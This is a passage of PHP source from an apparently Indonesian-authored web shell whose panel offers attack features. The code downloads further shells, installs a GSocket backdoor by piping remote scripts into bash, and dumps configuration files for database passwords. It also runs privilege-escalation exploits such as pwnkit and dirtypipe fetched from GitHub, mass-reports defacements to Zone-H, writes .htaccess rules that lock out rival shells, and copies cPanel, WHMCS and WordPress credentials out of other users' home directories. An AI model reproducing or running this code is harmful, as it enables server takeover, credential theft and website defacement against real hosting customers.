        $fileName = getcwd() . '/kobe-bypasslitespeed.php';
    } elseif ($_POST['option'] == '11') {
        $url = 'https://gist.githubusercontent.com/wongalus7/87164b6812d0708554cf9848e014ed75/raw/c157316edc97b52005bf2721216618112a70b626/chang.php';
        $fileName = getcwd() . '/kobe-cmd.php';
    }

    if ($url && $fileName) {
        downloadFile($url, $fileName);
    }}}}
    // gsocket
    if ($_1337["id"] == "gscok") {
    s();
    echo '<center class="anu">GSocket Install</center>
    <div class="card card-body text-dark input-group mb-3">
        <form method="POST">
            <i class="bi bi-folder"></i> Directory:
            <input class="form-control btn-sm text-dark" type="text" name="pathnyo" value="' . htmlspecialchars($dir) . '">
            <div class="form-check">
                <input class="form-check-input" type="radio" name="method" value="curl" checked>
                <label class="form-check-label" for="curl">Curl</label>
            </div>
            <div class="form-check">
                <input class="form-check-input" type="radio" name="method" value="wget">
                <label class="form-check-label" for="wget">Wget</label>
            </div>
            <div class="form-check mt-2">
                <input class="form-check-input" type="radio" name="gsopt" value="default" checked>
                <label class="form-check-label">Install Token Default</label><br>
                <input class="form-check-input" type="radio" name="gsopt" value="undo">
                <label class="form-check-label">Uninstall GSocket (GS_UNDO)</label><br>
                <input class="form-check-input" type="radio" name="gsopt" value="custom">
                <label class="form-check-label">Install with Custom Token</label>
            </div>
            <div class="mb-2">
                <input type="text" class="form-control form-control-sm text-dark mt-1" name="customtoken" placeholder="Your Secret Token (Optional)">
            </div>
            <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="change" value="Submit!">
            </div>
        </form>
    </div>';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['method']) && isset($_POST['pathnyo']) && isset($_POST['gsopt'])) {
        $method = $_POST['method'];
        $pathnyo = rtrim($_POST['pathnyo'], '/') . '/';
        $gsopt = $_POST['gsopt'];
        $token = trim($_POST['customtoken']);
        $command = '';
    
        if ($method == 'curl') {
            if ($gsopt == 'default') {
                $command = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';
            } elseif ($gsopt == 'undo') {
                $command = 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"; pkill -9 defunct';
            } elseif ($gsopt == 'custom' && !empty($token)) {
                $command = 'S="' . $token . '" bash -c "$(curl -fsSL https://gsocket.io/y)"';
            }
        } elseif ($method == 'wget') {
            if ($gsopt == 'default') {
                $command = 'bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"';
            } elseif ($gsopt == 'undo') {
                $command = 'GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"; pkill -9 defunct';
            } elseif ($gsopt == 'custom' && !empty($token)) {
                $command = 'S="' . $token . '" bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"';
            }
        }
    
        if (!empty($command)) {
            echo '<div class="shell mb-3">
                    <pre style="font-size:10px;"><code>' . exe($command, $pathnyo) . '</code></pre>
                  </div>';
        } else {
            echo "<div class='text-danger'>Invalid options or missing token for custom.</div>";
        }
    }    
    echo '</div>';
}

// config password searcher
if ($_1337["id"] == "conf") {
    s();
    $home = $_SERVER['DOCUMENT_ROOT'];
    $defaultTargetFiles = "wp-config.php
configuration.php
local.xml
settings.inc.php
config.php
conn.php
config.inc.php
koneksi.php
connect.php
connecr.php
.env
database.php";

    echo '<center class="anu">Config Searcher</center>
    <div class="form-group">
    <div class="card card-body text-dark input-group mb-3">
    <form method="POST">
        <div class="mb-3">
            <label for="sepconfig" class="form-label"><i class="bi bi-folder"></i> Directory:</label>
            <input class="form-control btn-sm text-dark" type="text" name="sepconfig" id="sepconfig" value="' . htmlspecialchars($home, ENT_QUOTES, "UTF-8") . '/" required>
        </div>
        <div class="mb-3">
            <label for="target_files" class="form-label"><i class="bi bi-file-earmark"></i> Config Files (u can add more):</label>
            <textarea class="form-control btn-sm text-dark" name="target_files" id="target_files" rows="15" required>' . htmlspecialchars($defaultTargetFiles, ENT_QUOTES, "UTF-8") . '</textarea>
        </div>
        <div class="d-grid gap-2">
            <input class="btn btn-dark btn-sm" type="submit" name="change" value="Submit!">
        </div>
    </form>
    </div>
    <center><p>Configuration file will be saved in a .txt file. You can see all the password lists from this database to use for CPanel, SSH, or other purposes (use responsibly).</p></center>';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sepconfig']) && isset($_POST['target_files'])) {
        $outputFilename = basename('kobeconfigresult.txt');
        $searchDir = $_POST['sepconfig'];
        $targetFilesInput = $_POST['target_files'];

        if (empty($searchDir) || !is_dir($searchDir)) {
            echo "<p>Invalid or empty directory specified.</p>";
            return;
        }
        $targetFiles = array_filter(array_map('trim', explode("\n", $targetFilesInput)));

        function searchFiles($dir, $targetFiles, &$foundFiles, $maxDepth = 5, $currentDepth = 0) {
            if ($currentDepth > $maxDepth) {
                return;
            }

            $iterator = new DirectoryIterator($dir);
            foreach ($iterator as $item) {
                if ($item->isDot()) {
                    continue;
                }

                $path = $item->getPathname();
                if ($item->isDir()) {
                    searchFiles($path, $targetFiles, $foundFiles, $maxDepth, $currentDepth + 1);
                } elseif (in_array($item->getFilename(), $targetFiles)) {
                    $foundFiles[] = $path;
                }
            }
        }

        $foundFiles = [];
        searchFiles($searchDir, $targetFiles, $foundFiles);

        $result = '';        
        if (!empty($foundFiles)) {
            foreach ($foundFiles as $file) {
                $fileSize = filesize($file);
                $result .= "File found: $file (Size: {$fileSize} bytes)\n";
                if ($fileSize > 0) {
                    $content = file_get_contents($file);
                    if ($content !== false) {
                        $result .= "######## Start of $file ########\n";
                        $result .= $content . "\n";
                        $result .= "######## End of $file ########\n\n";
                    }
                }
            }
        } else {
            $result = "No target files were found.\n";
        }
        if (file_put_contents($outputFilename, $result)) {
            echo "<center><p>Success! The results were saved to <a href='$outputFilename' target='_blank' style='text-decoration:none;color:red'>$outputFilename</a></p>";
        } else {
            echo "<p>Failed to save the result.</p></center>";
        }
    }
}
    // zone h
    if ($_1337["id"] == "zoneh") {
        s();
        echo '<center class="anu">Zone-H Mass Notify</center>';
        echo "<div class='card card-body text-dark input-group mb-3'>";
        if ($_POST["submit"]) {
            $domain = explode("\r\n", $_POST["url"]);
            $nick = $_POST["nick"];
            echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
            echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";

            function zoneh($url, $nick)
            {
                $ch = curl_init("http://www.zone-h.com/notify/single");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt(
                    $ch,
                    CURLOPT_POSTFIELDS,
                    "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send"
                );
                return curl_exec($ch);
                curl_close($ch);
            }

            foreach ($domain as $url) {
                $zoneh = zoneh($url, $nick);
                if (preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                    echo "$url -> OK<br>";
                } else {
                    echo "$url -> ERROR!<br>";
                }
            }
        } else {
            echo '<form method="post">
            <i class="bi bi-person"></i> Attacker Name: 
                <input type="text" class="form-control btn-sm text-dark" name="nick" size="50" placeholder="Kobe" id="nick">
                <i class="bi bi-globe2"></i> Domain List: 
                <textarea class="form-control btn-sm text-dark" rows="7" name="url" placeholder="https://example.go.id/o.txt
https://site.example.go.id/o.txt" style="resize: vertical;" id="url"></textarea>
            <div class="d-grid gap-2">
            <input class="btn btn-dark btn-sm" type="submit" name="submit" value="Submit!">
            </div>
        </form>';
        }

        echo "</div></div>";
    }

    // create htaccess
if ($_1337["id"] == "createhtaccess") {
    s();
    echo '<center class="anu">Create .htaccess</center>';
    if (isset($_1337['bikin'])) {
        $selectedContent = isset($_1337['content']) ? $_1337['content'] : '';
        $isiFile = '';
        $namafile = isset($_POST['namafile']) ? $_POST['namafile'] : '';
        if ($selectedContent == 'content1') {
            $isiFile = "<Files ~ '\.(xml|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|php5|php)$'>
Allow from all
</Files>";
        } elseif ($selectedContent == 'content2') {
            $isiFile = "<FilesMatch '.*\.(phtml|php|PhP|php5|suspected)$'>
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch '^($namafile)$'>
Order Allow,Deny
Allow from all
</FilesMatch>";
        }
        $setNama = '.htaccess';
        $result = file_put_contents($setNama, $isiFile);
        chmod($setNama, 0444);
        if ($result !== false) {
            echo '<strong>Create file</strong> ok! ' . ok() . '</div>';
        } else {
            echo '<strong>Create file</strong> fail! ' . er() . '</div>';
        }
    }
    echo "
    <div class='mb-3'>
        <u>Defense Shell</u>
        <form method='POST' id='defenseShellForm'>
            <input type='hidden' name='id' value='createhtaccess'>
            <div class='d-grid gap-2'>
                <label><input type='radio' name='content' value='content1' checked onclick='toggleShellNameInput(false)'> htaccess Allow All</label>
                <label><input type='radio' name='content' value='content2' onclick='toggleShellNameInput(true)'> htaccess Only Allow Your Shell (enter name shell before create!!)</label>
                <label>use | if you have 2 files</label>
                <label>example:</label>
                <label><strong>index.php|indeex.php</strong> / <strong>aa.php|bb.php|cc.php</strong></label>
                <label id='namafile' for='namafile'>Shell Name: <input class='form-control form-control-sm' type='text' name='namafile'></label>
                <input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Create'>
            </div>
        </form>
    </div>
    <script>
        function toggleShellNameInput(show) {
            document.getElementById('namafile').style.display = show ? 'block' : 'none';
        }
        toggleShellNameInput(false);
    </script>";
}

    // search by ext
if ($_1337["id"] == "searchbyext") {
    function search_by_extension($dir, $extensi, $sort_by_date) {
        $files = [];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isFile() && pathinfo($file, PATHINFO_EXTENSION) == $extensi) {
                $files[] = $file->getPathname();
            }
        }
        if ($sort_by_date) {
            usort($files, function($a, $b) {
                return filemtime($b) - filemtime($a);
            });
        }
        return $files;
    }
    s();
    echo '<center class="anu">Search By Extension</center>';
    if ($_1337['start']) {
        $dir = $_1337['d_dir'];
        $extensi = ltrim($_1337['extensi'], '.');
        $sort_by_date = isset($_1337['sort_by_date']) && $_1337['sort_by_date'] == 'on';
        $search_results = search_by_extension($dir, $extensi, $sort_by_date);
        if (!empty($search_results)) {
            echo "<div class='card card-body text-dark mb-3'>Results for extension .$extensi in directory $dir:<ul>";
            foreach ($search_results as $file) {
                $fileDate = date('Y-m-d H:i:s', filemtime($file));
                echo "<li>$fileDate - $file</li>";
            }
            echo "</ul></div>";
        } else {
            echo "<div class='card card-body text-dark mb-3'>No files with extension .$extensi found in directory $dir.</div>";
        }
    }
    echo "
    <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'>
            <div class='input-group d-flex gap-2'>
                <i class='bi bi-folder'></i> Directory:
            </div>
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='text' name='d_dir' value='".htmlspecialchars($path)."' required>
            </div>
            <div class='input-group d-flex gap-2'>
                <i class='bi bi-file-earmark'></i> Extension:
            </div>
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='text' name='extensi' placeholder='.php' value='".(isset($_1337['extensi']) ? htmlspecialchars($_1337['extensi']) : '')."' required>
            </div>
            <div class='form-check'>
                <input class='form-check-input' type='checkbox' name='sort_by_date' id='sort_by_date' ".(isset($_1337['sort_by_date']) && $_1337['sort_by_date'] == 'on' ? 'checked' : '').">
                <label class='form-check-label' for='sort_by_date'>Sort by date</label>
            </div>
            <div class='d-grid gap-2'>
                <input class='btn btn-dark btn-sm' type='submit' name='start' value='Search'>
            </div>
        </form>
    </div>";
}

// phpmailer
if ($_1337["id"] == "phpmailer") {
    s();
    echo '<center class="anu">PHP Mailer</center>';
    if ($_1337["start"]) {
        $email_penerima = isset($_1337["email_penerima"]) ? $_1337["email_penerima"] : '';
        $subjek = isset($_1337["subjek"]) ? $_1337["subjek"] : '';
        $pesan = isset($_1337["pesan"]) ? $_1337["pesan"] : '';
        if (filter_var($email_penerima, FILTER_VALIDATE_EMAIL)) {
            if (@mail($email_penerima, $subjek, $pesan)) {
                echo '<div class="card card-body text-dark mb-3"><strong>PHPMailer</strong> Sending! ' . ok() . '</div>';
            } else {
                echo '<div class="card card-body text-dark mb-3"><strong>PHPMailer</strong> Failed! ' . er() . '</div>';
            }
        } else {
            echo '<div class="card card-body text-dark mb-3"><strong>Invalid email address</strong> Failed! ' . er() . '</div>';
        }
    }
    echo "
    <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'>
            <input type='hidden' name='id' value='phpmailer'>
            <div class='input-group d-flex gap-2'>
                <i class='bi bi-envelope'></i> Email Receiver:
            </div>
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='email' name='email_penerima' placeholder='Enter email' value='".(isset($_1337["email_penerima"]) ? htmlspecialchars($_1337["email_penerima"]) : 'admin@admin.com')."' required>
            </div>
            <div class='input-group d-flex gap-2 mt-2'>
                <i class='bi bi-chat-square-text'></i> Subject:
            </div>
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='text' name='subjek' placeholder='Enter subject' value='".(isset($_1337["subjek"]) ? htmlspecialchars($_1337["subjek"]) : 'Hi Admin')."' required>
            </div>
            <div class='input-group d-flex gap-2 mt-2'>
                <i class='bi bi-textarea'></i> Message:
            </div>
            <div class='input-group'>
                <textarea class='form-control btn-sm text-dark' rows='7' name='pesan' placeholder='Your message' required>".(isset($_1337["pesan"]) ? htmlspecialchars($_1337["pesan"]) : '')."</textarea>
            </div>
            <div class='d-grid gap-2 mt-2'>
                <input class='btn btn-dark btn-sm' type='submit' name='start' value='Send'>
            </div>
        </form>
    </div>";
}

// scan root
if ($_1337["id"] == "scan_root") {
    s();
    echo '<center class="anu">Scan Root</center>';
    echo "
    <div class='text-center'>
        <div class='btn-group mb-3'>
            <a class='btn btn-outline-light btn-sm' href='?dir=".htmlspecialchars($path)."&id=scan_root&id_two=autoscan'><i class='bi bi-bug'></i> Auto Scan</a>
            <a class='btn btn-outline-light btn-sm' href='?dir=".htmlspecialchars($path)."&id=scan_root&id_two=scansd'><i class='bi bi-search'></i> Scan SUID</a>
            <a class='btn btn-outline-light btn-sm' href='?dir=".htmlspecialchars($path)."&id=scan_root&id_two=esg'><i class='bi bi-search'></i> Exploit Suggester</a>
        </div>
    </div>";
    if (!function_exists("proc_open")) {
        echo "<div class='card card-body mb-3' style='background-color: #41464b;'><center class='text-light'>Command execution is disabled!</center></div>";
    }
    if (!is_writable($path)) {
        echo "<div class='card card-body mb-3' style='background-color: #41464b;'><center class='text-light'>Current directory is unwritable!</center></div>";
    }
    if (isset($_1337['id_two']) && $_1337['id_two'] == "autoscan") {
        if (!file_exists($path . "/rooting/")) {
            mkdir($path . "/rooting");
            exe("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz", $path . "/rooting");
            exe("tar -xf auto.tar.gz", $path . "/rooting");
            if (!file_exists($path . "/rooting/netfilter")) {
                echo "<div class='card card-body mb-3' style='background-color: #41464b;'><center class='text-light'>Failed to download material!</center></div>";
            }
        }
        echo '
        <div class="container-fluid">
            <div class="shell mb-3">
                <pre style="font-size:10px;"><code>Netfilter: ' . exe("timeout 10 ./rooting/netfilter", $path) . '
Ptrace: ' . exe("echo id | timeout 10 ./rooting/ptrace", $path) . '
Sequoia: ' . exe("timeout 10 ./rooting/sequoia", $path) . '
OverlayFS: ' . exe("echo id | timeout 10 ./overlayfs", $path . "/rooting") . '
Dirtypipe: ' . exe("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $path) . '
Sudo: ' . exe("echo 12345 | timeout 10 sudoedit -s Y", $path) . '
Pwnkit: ' . exe("echo id | timeout 10 ./pwnkit", $path . "/rooting") . @exe("rm -rf ./rooting | timeout 10 ") . '</code></pre>
            </div>
        </div>';
    } elseif (isset($_1337['id_two']) && $_1337['id_two'] == "scansd") {
        echo '<div class="card card-body mb-3" style="background-color: #41464b;"><center class="text-light">[+] Scanning...</center></div>';
        echo '
        <div class="container-fluid">
            <div class="shell mb-3">
                <pre style="font-size:10px;"><code>' . exe("find / -perm -u=s -type f 2>/dev/null", $path) . '</code></pre>
            </div>
        </div>';
    } elseif (isset($_1337['id_two']) && $_1337['id_two'] == "esg") {
        echo '<div class="card card-body mb-3" style="background-color: #41464b;"><center class="text-light">[+] Loading...</center></div>';
        echo '
        <div class="container-fluid">
            <div class="shell mb-3">
                <pre style="font-size:10px;"><code>' . exe("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path) . '</code></pre>
            </div>
        </div>';
    }
}

// webshell killer
if ($_1337["id"] == "webshell_killer") {
    s();
    echo '<center class="anu">Webshell Killer</center>';
    if (isset($_1337['bikin'])) {
        $selectedContent = isset($_1337['content']) ? $_1337['content'] : '';
        $isiFile = '';
        $namafile = isset($_1337['namafile']) ? $_1337['namafile'] : '';
        if ($selectedContent == 'content1') {
            $isiFile = "<FilesMatch \"\\.(phtml|php|PhP|php5|suspected)\$\">\n"
                     . "    Order Allow,Deny\n"
                     . "    Deny from all\n"
                     . "</FilesMatch>\n"
                     . "<FilesMatch \"^(config\\.php|index\\.php|wp-config\\.php|robots\\.txt|configuration\\.php|settings\\.php|config\\.inc\\.php|default\\.settings\\.php|app/etc/config\\.xml|config/settings\\.inc\\.php)\$\">\n"
                     . "    Order Allow,Deny\n"
                     . "    Allow from all\n"
                     . "</FilesMatch>\n"
                     . "<IfModule mod_rewrite.c>\n"
                     . "    RewriteEngine On\n"
                     . "    RewriteBase /\n"
                     . "    RewriteRule ^index\\.php\$ - [L]\n"
                     . "    RewriteCond %{REQUEST_FILENAME} !-f\n"
                     . "    RewriteCond %{REQUEST_FILENAME} !-d\n"
                     . "    RewriteRule . /index\\.php [L]\n"
                     . "</IfModule>\n"
                     . "ErrorDocument 403 /index.php\n"
                     . "ErrorDocument 404 /index.php";
        } elseif ($selectedContent == 'content2' && !empty($namafile)) {
            $allowedFiles = implode('|', array_map('preg_quote', explode('|', $namafile), array('/')));
            $isiFile = "<FilesMatch \"\\.(phtml|php|PhP|php5|suspected)\$\">\n"
                     . "    Order Allow,Deny\n"
                     . "    Deny from all\n"
                     . "</FilesMatch>\n"
                     . "<FilesMatch \"^(config\\.php|index\\.php|wp-config\\.php|robots\\.txt|configuration\\.php|settings\\.php|config\\.inc\\.php|default\\.settings\\.php|app/etc/config\\.xml|config/settings\\.inc\\.php|$allowedFiles)\$\">\n"
                     . "    Order Allow,Deny\n"
                     . "    Allow from all\n"
                     . "</FilesMatch>\n"
                     . "<IfModule mod_rewrite.c>\n"
                     . "    RewriteEngine On\n"
                     . "    RewriteBase /\n"
                     . "    RewriteRule ^index\\.php\$ - [L]\n"
                     . "    RewriteCond %{REQUEST_FILENAME} !-f\n"
                     . "    RewriteCond %{REQUEST_FILENAME} !-d\n"
                     . "    RewriteRule . /index\\.php [L]\n"
                     . "</IfModule>\n"
                     . "ErrorDocument 403 /index.php\n"
                     . "ErrorDocument 404 /index.php";
        }
        $rootPath = $_SERVER['DOCUMENT_ROOT'];
        $success = true;
        $results = [];
        if (is_dir($rootPath)) {
            $dirs = array_diff(scandir($rootPath), ['.', '..']);
            foreach ($dirs as $dir) {
                $dirPath = $rootPath . '/' . $dir;
                if (is_dir($dirPath) && $dirPath !== $path) { // Exclude current directory
                    $htaccessPath = $dirPath . '/.htaccess';
                    if (is_writable($dirPath)) {
                        if (file_put_contents($htaccessPath, $isiFile) !== false) {
                            chmod($htaccessPath, 0444);
                            $results[] = "<li><span style='color: #28a745;'>Success:</span> .htaccess created in $dirPath</li>"; // Green for success
                        } else {
                            $results[] = "<li><span style='color: #dc3545;'>Failed:</span> Unable to create .htaccess in $dirPath</li>"; // Red for failure
                            $success = false;
                        }
                    } else {
                        $results[] = "<li><span style='color: #dc3545;'>Failed:</span> $dirPath is not writable</li>"; // Red for failure
                        $success = false;
                    }
                }
            }
        } else {
            $success = false;
            $results[] = "<li><span style='color: #dc3545;'>Failed:</span> Root path ($rootPath) is not accessible</li>"; // Red for failure
        }
        echo '<div class="card card-body mb-3" style="background-color: #212529;">';
        if ($success && !empty($results)) {
            echo '<span class="text-light"><strong>Webshell Killer Applied Successfully!</strong></span> ' . ok() . '<ul class="text-light">' . implode('', $results) . '</ul>';
        } else {
            echo '<span class="text-green"><strong>Webshell Killer Failed in Some Directories!</strong></span> ' . er() . '<ul class="text-light">' . implode('', $results) . '</ul>';
        }
        echo '</div>';
    }
    echo "
    <div class='card card-body mb-3' style='background-color: #212529;'>
        <form method='POST' id='webshellKillerForm'>
            <input type='hidden' name='id' value='webshell_killer'>
            <div class='d-grid gap-2'>
                <label><input class='form-check-input' type='radio' name='content' value='content1' checked onclick='toggleShellNameInput(false)'> Block Webshells, Allow CMS Files</label>
                <label><input class='form-check-input' type='radio' name='content' value='content2' onclick='toggleShellNameInput(true)'> Block Webshells, Allow Specified Shells</label>
                <label class='text-white'>Use | if you have multiple files</label>
                <label class='text-white'>Example:</label>
                <label class='text-white'><strong>index.php|myfile.php</strong> / <strong>aa.php|bb.php|cc.php</strong></label>
                <label id='namafile' for='namafile' class='text-white'>Shell Name: <input class='form-control form-control-sm' type='text' name='namafile'></label>
                <input class='btn btn-sm' type='submit' name='bikin' value='Create' style='background-color: #212529; border-color: #ffffff; color: #ffffff;'>
            </div>
        </form>
    </div>
    <script>
        function toggleShellNameInput(show) {
            document.getElementById('namafile').style.display = show ? 'block' : 'none';
        }
        toggleShellNameInput(false);
    </script>";
}

// symlink hard
if ($_1337["id"] == "symlink") {
    s();
    echo '<center class="anu">Symlink Extractor</center>';
    if (isset($_1337['conf'])) {
        @ini_set("html_errors", 0);
        @ini_set("max_execution_time", 0);
        @ini_set("display_errors", 0);
        @ini_set("file_uploads", 1);
        $home = $_1337['home'];
        $folfig = $path . '/' . $home;
        @mkdir($folfig, 0755);
        @chdir($folfig);
        $htaccess = $_1337['achon666ju5t'];
        file_put_contents(".htaccess", $htaccess, FILE_APPEND);
        $passwd = explode("\n", $_1337['passwd']);
        $results = [];
        foreach ($passwd as $pwd) {
            $user = trim($pwd);
            if (!empty($user)) {
                $userHome = "/$home/$user";
                // Symlink and copy operations
                symlink($userHome . "/.my.cnf", $user . "  CPANEL");
                copy($userHome . "/.my.cnf", $user . "  CPANEL.txt");
                symlink($userHome . "/.accesshash", $user . "  WHMCS.txt");
                copy($userHome . "/.accesshash", $user . "  WHMCS.txt");
                symlink($userHome . "/public_html/suspended.page/index.html", $user . "  RESELLER.txt");
                copy($userHome . "/public_html/suspended.page/index.html", $user . "  RESELLER.txt");
                symlink($userHome . "/public_html/.accesshash", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/configuration.php", $user . "  WHMCS or JOOMLA.txt");
                copy($userHome . "/public_html/account/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/accounts/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/buy/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/checkout/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/central/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clienti/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/client/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/cliente/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clientes/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clients/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clientarea/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clientsarea/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/client-area/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clients-area/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/clientzone/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/client-zone/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/core/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/company/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/customer/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/customers/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/bill/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/billing/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/finance/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/financeiro/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/host/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/hosts/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/hosting/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/hostings/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/klien/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/manage/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/manager/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/member/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/members/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/my/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/myaccount/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/my-account/client/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/myaccounts/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/my-accounts/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/order/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/orders/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/painel/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/panel/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/panels/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/portal/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/portals/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/purchase/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/secure/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/support/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/supporte/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/supports/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/web/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/webhost/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/webhosting/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/whm/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/whmcs/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/whmcs2/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/Whm/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/Whmcs/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/WHM/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/WHMCS/configuration.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/wp/test/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/blog/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/beta/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/portal/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/site/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/wp/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/WP/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/news/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/wordpress/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/test/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/demo/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/home/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/v1/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/v2/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/press/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/new/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/blogs/wp-config.php", $user . "  WORDPRESS.txt");
                copy($userHome . "/public_html/blog/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/submitticket.php", $user . "  WHMCS.txt");
                copy($userHome . "/public_html/cms/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/beta/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/portal/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/site/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/main/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/home/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/demo/configuration.php", $user . "  JOOMLA.txt");
